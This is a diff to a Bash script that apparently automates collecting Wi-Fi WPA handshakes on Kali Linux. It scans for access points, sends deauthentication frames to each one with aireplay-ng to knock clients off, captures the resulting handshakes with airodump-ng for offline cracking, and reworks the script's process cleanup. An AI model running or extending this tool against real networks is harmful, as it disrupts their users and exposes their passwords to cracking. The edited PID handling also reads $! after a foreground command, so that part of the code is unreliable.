@@ -90,6 +90,7 @@ checkHandshakes() {
 
 }
 
+airodumpPID=""
 passive() {
   trap 'checkHandshakes;rm /home/kali/hscollector/shakes-*; getparams' EXIT
   airmon-ng start $interface >/dev/null
@@ -101,7 +102,7 @@ passive() {
 }
 
 active() {
-  trap 'kill $!;rm /home/kali/hscollector/shakes-* &> /dev/null; getparams' EXIT
+  trap 'cleanup; getparams' EXIT
   echo "Collect APs..."
   timeout 10 airodump-ng -w /home/kali/hscollector/shakesCollector $interface </dev/null >/dev/null 
   while IFS=";" read -r id NetType ESSID BSSID Info Channel Cloaked Encryption Decrypted MaxRate MaxSeenRate Beacon LLC Data Crypt Weak Total Carrier Encoding FirstTime LastTime BestQuality BestSignal; do        
@@ -116,10 +117,10 @@ active() {
           printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
           iwconfig $interface channel $Channel
           aireplay-ng -a $BSSID -0 5 $interface &
-          airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &> /dev/null &
-          pid=`echo $!`
-          sleep 20 
-          kill -9 $pid
+          timeout --foreground 10s airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &> /dev/null
+          airodumpPID=`echo $!`
+          echo "airodumpPID:"$airodumpPID
+          kill $airodumpPID
           checkHandshakes
           rm /home/kali/hscollector/shakes-01.* >/dev/null
           
@@ -198,6 +199,7 @@ getparams(){
 }
 
 cleanup(){
+        kill -9 $airodumpPID
         rm /home/kali/hscollector/shakes* &> /dev/null
         rm /home/kali/hscollector/cleanshakes.hccapx &> /dev/null
         exit 1
